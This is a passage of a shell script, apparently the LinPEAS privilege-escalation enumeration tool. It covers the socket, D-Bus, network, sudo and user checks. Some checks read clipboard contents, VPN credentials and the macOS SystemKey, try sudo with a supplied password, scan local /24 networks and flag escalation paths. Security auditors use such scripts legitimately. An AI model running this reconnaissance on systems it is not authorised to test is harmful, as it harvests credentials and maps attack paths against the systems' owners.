  2756	    echo "$t" | sed -${E} "s,.*,${SED_RED},g"
  2757	  fi
  2758	  timerbinpaths=$(grep -Po '^Unit=*(.*?$)' $t 2>/dev/null | cut -d '=' -f2)
  2759	  printf "%s\n" "$timerbinpaths" | while read tb; do
  2760	    if [ -w "$tb" ]; then
  2761	      echo "$t timer is calling this writable executable: $tb" | sed "s,writable.*,${SED_RED},g"
  2762	    fi
  2763	  done
  2764	  #relpath="`grep -Po '^Unit=[^/].*' \"$t\" 2>/dev/null`"
  2765	  #for rp in "$relpath"; do
  2766	  #  echo "$t is calling a relative path: $rp" | sed "s,relative.*,${SED_RED},g"
  2767	  #done
  2768	done
  2769	echo ""
  2770	
  2771	#-- PSC) .socket files
  2772	#TODO: .socket files in MACOS are folders
  2773	if ! [ "$IAMROOT" ]; then
  2774	  print_2title "Analyzing .socket files"
  2775	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets"
  2776	  printf "%s\n" "$PSTORAGE_SOCKET" | while read s; do
  2777	    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
  2778	      echo "Writable .socket file: $s" | sed "s,/.*,${SED_RED},g"
  2779	    fi
  2780	    socketsbinpaths=$(grep -Eo '^(Exec).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
  2781	    printf "%s\n" "$socketsbinpaths" | while read sb; do
  2782	      if [ -w "$sb" ]; then
  2783	        echo "$s is calling this writable executable: $sb" | sed "s,writable.*,${SED_RED},g"
  2784	      fi
  2785	    done
  2786	    socketslistpaths=$(grep -Eo '^(Listen).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
  2787	    printf "%s\n" "$socketslistpaths" | while read sl; do
  2788	      if [ -w "$sl" ]; then
  2789	        echo "$s is calling this writable listener: $sl" | sed "s,writable.*,${SED_RED},g";
  2790	      fi
  2791	    done
  2792	  done
  2793	  echo ""
  2794	  
  2795	  if ! [ "$SEARCH_IN_FOLDER" ]; then
  2796	    print_2title "Unix Sockets Listening"
  2797	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets"
  2798	    # Search sockets using netstat and ss
  2799	    unix_scks_list=$(ss -xlp -H state listening 2>/dev/null | grep -Eo "/.* " | cut -d " " -f1)
  2800	    if ! [ "$unix_scks_list" ];then
  2801	      unix_scks_list=$(ss -l -p -A 'unix' 2>/dev/null | grep -Ei "listen|Proc" | grep -Eo "/[a-zA-Z0-9\._/\-]+")
  2802	    fi
  2803	    if ! [ "$unix_scks_list" ];then
  2804	      unix_scks_list=$(netstat -a -p --unix 2>/dev/null | grep -Ei "listen|PID" | grep -Eo "/[a-zA-Z0-9\._/\-]+" | tail -n +2)
  2805	    fi
  2806	     unix_scks_list3=$(lsof -U 2>/dev/null | awk '{print $9}' | grep "/") 
  2807	  fi
  2808	  
  2809	  if ! [ "$SEARCH_IN_FOLDER" ]; then
  2810	    # But also search socket files
  2811	    unix_scks_list2=$(find / -type s 2>/dev/null)
  2812	  else
  2813	    unix_scks_list2=$(find "SEARCH_IN_FOLDER" -type s 2>/dev/null)
  2814	  fi
  2815	
  2816	  # Detele repeated dockets and check permissions
  2817	  (printf "%s\n" "$unix_scks_list" && printf "%s\n" "$unix_scks_list2" && printf "%s\n" "$unix_scks_list3") | sort | uniq | while read l; do
  2818	    perms=""
  2819	    if [ -r "$l" ]; then
  2820	      perms="Read "
  2821	    fi
  2822	    if [ -w "$l" ];then
  2823	      perms="${perms}Write"
  2824	    fi
  2825	    
  2826	    if [ "$EXTRA_CHECKS" ] && [ "$(command -v curl)" ]; then
  2827	      CANNOT_CONNECT_TO_SOCKET="$(curl -v --unix-socket "$l" --max-time 1 http:/linpeas 2>&1 | grep -i 'Permission denied')"
  2828	      if ! [ "$CANNOT_CONNECT_TO_SOCKET" ]; then
  2829	        perms="${perms} - Can Connect"
  2830	      else
  2831	        perms="${perms} - Cannot Connect"
  2832	      fi
  2833	    fi
  2834	    
  2835	    if ! [ "$perms" ]; then echo "$l" | sed -${E} "s,$l,${SED_GREEN},g";
  2836	    else 
  2837	      echo "$l" | sed -${E} "s,$l,${SED_RED},g"
  2838	      echo "  M-bM-^TM-^TM-bM-^TM-^@(${RED}${perms}${NC})" | sed -${E} "s,Cannot Connect,${SED_GREEN},g"
  2839	      # Try to contact the socket
  2840	      socketcurl=$(curl --max-time 2 --unix-socket "$s" http:/index 2>/dev/null)
  2841	      if [ $? -eq 0 ]; then
  2842	        owner=$(ls -l "$s" | cut -d ' ' -f 3)
  2843	        echo "Socket $s owned by $owner uses HTTP. Response to /index: (limt 30)" | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
  2844	        echo "$socketcurl" | head -n 30
  2845	      fi
  2846	    fi
  2847	  done
  2848	  echo ""
  2849	fi
  2850	
  2851	#-- PSC) Writable and weak policies in D-Bus config files
  2852	print_2title "D-Bus config files"
  2853	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus"
  2854	if [ "$PSTORAGE_DBUS" ]; then
  2855	  printf "%s\n" "$PSTORAGE_DBUS" | while read d; do
  2856	    for f in $d/*; do
  2857	      if ! [ "$IAMROOT" ] && [ -w "$f" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
  2858	        echo "Writable $f" | sed -${E} "s,.*,${SED_RED},g"
  2859	      fi
  2860	
  2861	      genpol=$(grep "<policy>" "$f" 2>/dev/null)
  2862	      if [ "$genpol" ]; then printf "Weak general policy found on $f ($genpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
  2863	      #if [ "`grep \"<policy user=\\\"$USER\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak user policy found on $f () \n" | sed "s,$USER,${SED_RED},g"; fi
  2864	
  2865	      userpol=$(grep "<policy user=" "$f" 2>/dev/null | grep -v "root")
  2866	      if [ "$userpol" ]; then printf "Possible weak user policy found on $f ($userpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
  2867	      #for g in `groups`; do
  2868	      #  if [ "`grep \"<policy group=\\\"$g\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak group ($g) policy found on $f\n" | sed "s,$g,${SED_RED},g"; fi
  2869	      #done
  2870	      grppol=$(grep "<policy group=" "$f" 2>/dev/null | grep -v "root")
  2871	      if [ "$grppol" ]; then printf "Possible weak user policy found on $f ($grppol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
  2872	
  2873	      #TODO: identify allows in context="default"
  2874	    done
  2875	  done
  2876	fi
  2877	echo ""
  2878	
  2879	if ! [ "$SEARCH_IN_FOLDER" ]; then
  2880	  print_2title "D-Bus Service Objects list"
  2881	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus"
  2882	  dbuslist=$(busctl list 2>/dev/null)
  2883	  if [ "$dbuslist" ]; then
  2884	    busctl list | while read line; do
  2885	      echo "$line" | sed -${E} "s,$dbuslistG,${SED_GREEN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},";
  2886	      if ! echo "$line" | grep -qE "$dbuslistG"; then
  2887	        srvc_object=$(echo $line | cut -d " " -f1)
  2888	        srvc_object_info=$(busctl status "$srvc_object" 2>/dev/null | grep -E "^UID|^EUID|^OwnerUID" | tr '\n' ' ')
  2889	        if [ "$srvc_object_info" ]; then
  2890	          echo " -- $srvc_object_info" | sed "s,UID=0,${SED_RED},"
  2891	        fi
  2892	      fi
  2893	    done
  2894	  else echo_not_found "busctl"
  2895	  fi
  2896	fi
  2897	
  2898	fi
  2899	echo ''
  2900	echo ''
  2901	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  2902	
  2903	if echo $CHECKS | grep -q network_information; then
  2904	print_title "Network Information"
  2905	###########################################
  2906	#---------) Network Information (---------#
  2907	###########################################
  2908	
  2909	if [ "$MACOS" ]; then
  2910	  print_2title "Network Capabilities"
  2911	  warn_exec system_profiler SPNetworkDataType
  2912	  echo ""
  2913	fi
  2914	
  2915	#-- NI) Hostname, hosts and DNS
  2916	print_2title "Hostname, hosts and DNS"
  2917	cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null
  2918	warn_exec dnsdomainname 2>/dev/null
  2919	echo ""
  2920	
  2921	#-- NI) /etc/inetd.conf
  2922	if [ "$EXTRA_CHECKS" ]; then
  2923	  print_2title "Content of /etc/inetd.conf & /etc/xinetd.conf"
  2924	  (cat /etc/inetd.conf /etc/xinetd.conf 2>/dev/null | grep -v "^$" | grep -Ev "\W+\#|^#" 2>/dev/null) || echo_not_found "/etc/inetd.conf"
  2925	  echo ""
  2926	fi
  2927	
  2928	#-- NI) Interfaces
  2929	print_2title "Interfaces"
  2930	cat /etc/networks 2>/dev/null
  2931	(ifconfig || ip a || (cat /proc/net/dev; cat /proc/net/fib_trie; cat /proc/net/fib_trie6)) 2>/dev/null
  2932	echo ""
  2933	
  2934	#-- NI) Neighbours
  2935	if [ "$EXTRA_CHECKS" ]; then
  2936	  print_2title "Networks and neighbours"
  2937	  if [ "$MACOS" ]; then
  2938	    netstat -rn 2>/dev/null
  2939	  else
  2940	    (route || ip n || cat /proc/net/route) 2>/dev/null
  2941	  fi
  2942	  (arp -e || arp -a || cat /proc/net/arp) 2>/dev/null
  2943	  echo ""
  2944	fi
  2945	
  2946	if [ "$MACPEAS" ]; then
  2947	  print_2title "Firewall status"
  2948	  warn_exec system_profiler SPFirewallDataType
  2949	fi
  2950	
  2951	#-- NI) Iptables
  2952	if [ "$EXTRA_CHECKS" ]; then
  2953	  print_2title "Iptables rules"
  2954	  (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null) 2>/dev/null || echo_not_found "iptables rules"
  2955	  echo ""
  2956	fi
  2957	
  2958	#-- NI) Ports
  2959	print_2title "Active Ports"
  2960	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports"
  2961	( (netstat -punta || ss -nltpu || netstat -anv) | grep -i listen) 2>/dev/null | sed -${E} "s,127.0.[0-9]+.[0-9]+|:::|::1:|0\.0\.0\.0,${SED_RED},g"
  2962	echo ""
  2963	
  2964	#-- NI) MacOS hardware ports
  2965	if [ "$MACPEAS" ] && [ "$EXTRA_CHECKS" ]; then
  2966	  print_2title "Hardware Ports"
  2967	  networksetup -listallhardwareports
  2968	  echo ""
  2969	
  2970	  print_2title "VLANs"
  2971	  networksetup -listVLANs
  2972	  echo ""
  2973	
  2974	  print_2title "Wifi Info"
  2975	  networksetup -getinfo Wi-Fi
  2976	  echo ""
  2977	
  2978	  print_2title "Check Enabled Proxies"
  2979	  scutil --proxy
  2980	  echo ""
  2981	
  2982	  print_2title "Wifi Proxy URL"
  2983	  networksetup -getautoproxyurl Wi-Fi
  2984	  echo ""
  2985	  
  2986	  print_2title "Wifi Web Proxy"
  2987	  networksetup -getwebproxy Wi-Fi
  2988	  echo ""
  2989	
  2990	  print_2title "Wifi FTP Proxy"
  2991	  networksetup -getftpproxy Wi-Fi
  2992	  echo ""
  2993	fi
  2994	
  2995	#-- NI) tcpdump
  2996	print_2title "Can I sniff with tcpdump?"
  2997	timeout 1 tcpdump >/dev/null 2>&1
  2998	if [ $? -eq 124 ]; then #If 124, then timed out == It worked
  2999	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing"
  3000	    echo "You can sniff with tcpdump!" | sed -${E} "s,.*,${SED_RED},"
  3001	else echo_no
  3002	fi
  3003	echo ""
  3004	
  3005	#-- NI) Internet access
  3006	if [ "$AUTO_NETWORK_SCAN" ] && [ "$TIMEOUT" ] && [ -f "/bin/bash" ]; then
  3007	  print_2title "Internet Access?"
  3008	  check_tcp_80 2>/dev/null &
  3009	  check_tcp_443 2>/dev/null &
  3010	  check_icmp 2>/dev/null &
  3011	  check_dns 2>/dev/null &
  3012	  wait
  3013	  echo ""
  3014	fi
  3015	
  3016	if [ "$AUTO_NETWORK_SCAN" ]; then
  3017	  if ! [ "$FOUND_NC" ] && ! [ "$FOUND_BASH" ]; then
  3018	    printf $RED"[-] $SCAN_BAN_BAD\n$NC"
  3019	    echo "The network is not going to be scanned..."
  3020	  
  3021	  elif ! [ "$(command -v ifconfig)" ] && ! [ "$(command -v ip a)" ]; then
  3022	    printf $RED"[-] No ifconfig or ip commands, cannot find local ips\n$NC"
  3023	    echo "The network is not going to be scanned..."
  3024	  
  3025	  else
  3026	    print_2title "Scanning local networks (using /24)"
  3027	
  3028	    if ! [ "$PING" ] && ! [ "$FPING" ]; then
  3029	      printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
  3030	    fi
  3031	
  3032	    select_nc
  3033	    local_ips=$( (ip a 2>/dev/null || ifconfig) | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
  3034	    printf "%s\n" "$local_ips" | while read local_ip; do
  3035	      if ! [ -z "$local_ip" ]; then
  3036	        print_3title "Discovering hosts in $local_ip/24"
  3037	        
  3038	        if [ "$PING" ] || [ "$FPING" ]; then
  3039	          discover_network "$local_ip/24" | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Network Discovery" | grep -v "Network Discovery" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $Wfolder/.ips.tmp
  3040	        fi
  3041	        
  3042	        discovery_port_scan "$local_ip/24" 22 | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Ports going to be scanned" | grep -v "Ports going to be scanned" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> $Wfolder/.ips.tmp
  3043	        
  3044	        sort $Wfolder/.ips.tmp | uniq > $Wfolder/.ips
  3045	        rm $Wfolder/.ips.tmp 2>/dev/null
  3046	        
  3047	        while read disc_ip; do
  3048	          me=""
  3049	          if [ "$disc_ip" = "$local_ip" ]; then
  3050	            me=" (local)"
  3051	          fi
  3052	          
  3053	          echo "Scanning top ports of ${disc_ip}${me}"
  3054	          (tcp_port_scan "$disc_ip" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
  3055	          echo ""
  3056	        done < $Wfolder/.ips
  3057	        
  3058	        rm $Wfolder/.ips 2>/dev/null
  3059	        echo ""
  3060	      fi
  3061	    done
  3062	    
  3063	    print_3title "Scanning top ports of host.docker.internal"
  3064	    (tcp_port_scan "host.docker.internal" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
  3065	    echo ""
  3066	  fi
  3067	fi
  3068	
  3069	if [ "$MACOS" ]; then
  3070	  print_2title "Any MacOS Sharing Service Enabled?"
  3071	  rmMgmt=$(netstat -na | grep LISTEN | grep tcp46 | grep "*.3283" | wc -l);
  3072	  scrShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.5900" | wc -l);
  3073	  flShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep -E "\*.88|\*.445|\*.548" | wc -l);
  3074	  rLgn=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.22" | wc -l);
  3075	  rAE=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.3031" | wc -l);
  3076	  bmM=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.4488" | wc -l);
  3077	  printf "\nThe following services are OFF if '0', or ON otherwise:\nScreen Sharing: %s\nFile Sharing: %s\nRemote Login: %s\nRemote Mgmt: %s\nRemote Apple Events: %s\nBack to My Mac: %s\n\n" "$scrShrng" "$flShrng" "$rLgn" "$rmMgmt" "$rAE" "$bmM";
  3078	  echo ""
  3079	  print_2title "VPN Creds"
  3080	  system_profiler SPNetworkLocationDataType | grep -A 5 -B 7 ": Password"  | sed -${E} "s,Password|Authorization Name.*,${SED_RED},"
  3081	  echo ""
  3082	
  3083	  if [ "$EXTRA_CHECKS" ]; then
  3084	    print_2title "Bluetooth Info"
  3085	    warn_exec system_profiler SPBluetoothDataType
  3086	    echo ""
  3087	
  3088	    print_2title "Ethernet Info"
  3089	    warn_exec system_profiler SPEthernetDataType
  3090	    echo ""
  3091	
  3092	    print_2title "USB Info"
  3093	    warn_exec system_profiler SPUSBDataType
  3094	    echo ""
  3095	  fi
  3096	fi
  3097	
  3098	fi
  3099	echo ''
  3100	echo ''
  3101	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  3102	
  3103	if echo $CHECKS | grep -q users_information; then
  3104	print_title "Users Information"
  3105	###########################################
  3106	#----------) Users Information (----------#
  3107	###########################################
  3108	
  3109	#-- UI) My user
  3110	print_2title "My user"
  3111	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users"
  3112	(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
  3113	echo ""
  3114	
  3115	if [ "$MACPEAS" ];then
  3116	  print_2title "Current user Login and Logout hooks"
  3117	  defaults read $HOME/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  3118	  echo ""
  3119	
  3120	  print_2title "All Login and Logout hooks"
  3121	  defaults read /Users/*/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  3122	  defaults read /private/var/root/Library/Preferences/com.apple.loginwindow.plist
  3123	  echo ""
  3124	
  3125	  print_2title "Keychains"
  3126	  print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#chainbreaker"
  3127	  security list-keychains
  3128	  echo ""
  3129	
  3130	  print_2title "SystemKey"
  3131	  ls -l /var/db/SystemKey
  3132	  if [ -r "/var/db/SystemKey" ]; then 
  3133	    echo "You can read /var/db/SystemKey" | sed -${E} "s,.*,${SED_RED_YELLOW},";
  3134	    hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey | sed -${E} "s,.*,${SED_RED_YELLOW},";
  3135	  fi
  3136	  echo ""
  3137	fi
  3138	
  3139	#-- UI) PGP keys?
  3140	print_2title "Do I have PGP keys?"
  3141	command -v gpg 2>/dev/null || echo_not_found "gpg"
  3142	gpg --list-keys 2>/dev/null
  3143	command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
  3144	netpgpkeys --list-keys 2>/dev/null
  3145	command -v netpgp 2>/dev/null || echo_not_found "netpgp"
  3146	echo ""
  3147	
  3148	#-- UI) Clipboard and highlighted text
  3149	if [ "$(command -v xclip 2>/dev/null)" ] || [ "$(command -v xsel 2>/dev/null)" ] || [ "$(command -v pbpaste 2>/dev/null)" ] || [ "$DEBUG" ]; then
  3150	  print_2title "Clipboard or highlighted text?"
  3151	  if [ "$(command -v xclip 2>/dev/null)" ]; then
  3152	    echo "Clipboard: "$(xclip -o -selection clipboard 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  3153	    echo "Highlighted text: "$(xclip -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  3154	  elif [ "$(command -v xsel 2>/dev/null)" ]; then
  3155	    echo "Clipboard: "$(xsel -ob 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  3156	    echo "Highlighted text: "$(xsel -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  3157	  elif [ "$(command -v pbpaste 2>/dev/null)" ]; then
  3158	    echo "Clipboard: "$(pbpaste) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  3159	  else echo_not_found "xsel and xclip"
  3160	  fi
  3161	  echo ""
  3162	fi
  3163	
  3164	#-- UI) Sudo -l
  3165	print_2title "Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d"
  3166	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid"
  3167	(echo '' | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,\!root,${SED_RED},") 2>/dev/null || echo_not_found "sudo"
  3168	if [ "$PASSWORD" ]; then
  3169	  (echo "$PASSWORD" | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g") 2>/dev/null  || echo_not_found "sudo"
  3170	fi
  3171	( grep -Iv "^$" cat /etc/sudoers | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" ) 2>/dev/null  || echo_not_found "/etc/sudoers"
  3172	if ! [ "$IAMROOT" ] && [ -w '/etc/sudoers.d/' ]; then
  3173	  echo "You can create a file in /etc/sudoers.d/ and escalate privileges" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  3174	fi
  3175	for filename in /etc/sudoers.d/*; do
  3176	  if [ -r "$filename" ]; then
  3177	    echo "Sudoers file: $filename is readable" | sed -${E} "s,.*,${SED_RED},g"
  3178	    grep -Iv "^$" "$filename" | grep -v "#" | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,pwfeedback,${SED_RED},g" 
  3179	  fi
  3180	done
  3181	echo ""
  3182	
  3183	#-- UI) Sudo tokens
  3184	print_2title "Checking sudo tokens"
  3185	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens"
  3186	ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
  3187	if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then 
  3188	  echo "ptrace protection is disabled (0), so sudo tokens could be abused" | sed "s,is disabled,${SED_RED},g";
  3189	  
  3190	  if [ "$(command -v gdb 2>/dev/null)" ]; then 
  3191	    echo "gdb was found in PATH" | sed -${E} "s,.*,${SED_RED},g";
  3192	  fi
  3193	  
  3194	  if [ "$CURRENT_USER_PIVOT_PID" ]; then 
  3195	    echo "The current user proc $CURRENT_USER_PIVOT_PID is the parent of a different user proccess" | sed -${E} "s,.*,${SED_RED},g";
  3196	  fi
  3197	  
  3198	  if [ -f "$HOME/.sudo_as_admin_successful" ]; then
  3199	    echo "Current user has .sudo_as_admin_successful file, so he can execute with sudo" | sed -${E} "s,.*,${SED_RED},";
  3200	  fi
  3201	
  3202	  if ps -eo pid,command -u "$(id -u)" | grep -v "$PPID" | grep -v " " | grep -qE '(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'; then
  3203	    echo "Current user has other interactive shells running: " | sed -${E} "s,.*,${SED_RED},g";
  3204	    ps -eo pid,command -u "$(id -u)" | grep -v "$PPID" | grep -v " " | grep -E '(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'
  3205	  fi
  3206	
  3207	else 
  3208	  echo "ptrace protection is enabled ($ptrace_scope)" | sed "s,is enabled,${SED_GREEN},g";
  3209	
  3210	fi
  3211	echo ""
  3212	
  3213	#-- UI) Doas
  3214	if [ -f "/etc/doas.conf" ] || [ "$DEBUG" ]; then
  3215	  print_2title "Checking doas.conf"
  3216	  doas_dir_name=$(dirname "$(command -v doas)" 2>/dev/null)
  3217	  if [ "$(cat /etc/doas.conf $doas_dir_name/doas.conf $doas_dir_name/../etc/doas.conf $doas_dir_name/etc/doas.conf 2>/dev/null)" ]; then 
  3218	    cat /etc/doas.conf "$doas_dir_name/doas.conf" "$doas_dir_name/../etc/doas.conf" "$doas_dir_name/etc/doas.conf" 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_RED}," | sed "s,root,${SED_RED}," | sed "s,nopass,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW},"
  3219	  else echo_not_found "doas.conf"
  3220	  fi
  3221	  echo ""
  3222	fi
  3223	
  3224	#-- UI) Pkexec policy
  3225	print_2title "Checking Pkexec policy"
  3226	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2"
  3227	(cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED}," | sed -${E} "s,$groupsVB,${SED_RED}," | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,$USER,${SED_RED_YELLOW}," | sed -${E} "s,$Groups,${SED_RED_YELLOW},") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
  3228	echo ""
  3229	
  3230	#-- UI) Superusers
  3231	print_2title "Superusers"
  3232	awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED_YELLOW}," | sed "s,root,${SED_RED},"
  3233	echo ""
  3234	
  3235	#-- UI) Users with console
  3236	print_2title "Users with console"
  3237	if [ "$MACPEAS" ]; then
  3238	  dscl . list /Users | while read uname; do
  3239	    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
  3240	    if grep -q "$ushell" /etc/shells; then #Shell user
  3241	      dscl . -read "/Users/$uname" UserShell RealName RecordName Password NFSHomeDirectory 2>/dev/null | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3242	      echo ""
  3243	    fi
  3244	  done
  3245	else
  3246	  no_shells=$(grep -Ev "sh$" /etc/passwd 2>/dev/null | cut -d ':' -f 7 | sort | uniq)
  3247	  unexpected_shells=""
  3248	  printf "%s\n" "$no_shells" | while read f; do
  3249	    if $f -c 'whoami' 2>/dev/null | grep -q "$USER"; then
  3250	      unexpected_shells="$f\n$unexpected_shells"
  3251	    fi
  3252	  done
  3253	  grep "sh$" /etc/passwd 2>/dev/null | sort | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
  3254	  if [ "$unexpected_shells" ]; then
  3255	    printf "%s" "These unexpected binaries are acting like shells:\n$unexpected_shells" | sed -${E} "s,/.*,${SED_RED},g"
  3256	    echo "Unexpected users with shells:"
  3257	    printf "%s\n" "$unexpected_shells" | while read f; do
  3258	      if [ "$f" ]; then
  3259	        grep -E "${f}$" /etc/passwd | sed -${E} "s,/.*,${SED_RED},g"
  3260	      fi
  3261	    done
  3262	  fi
  3263	fi
  3264	echo ""
  3265	
  3266	#-- UI) All users & groups
  3267	print_2title "All users & groups"
  3268	if [ "$MACPEAS" ]; then
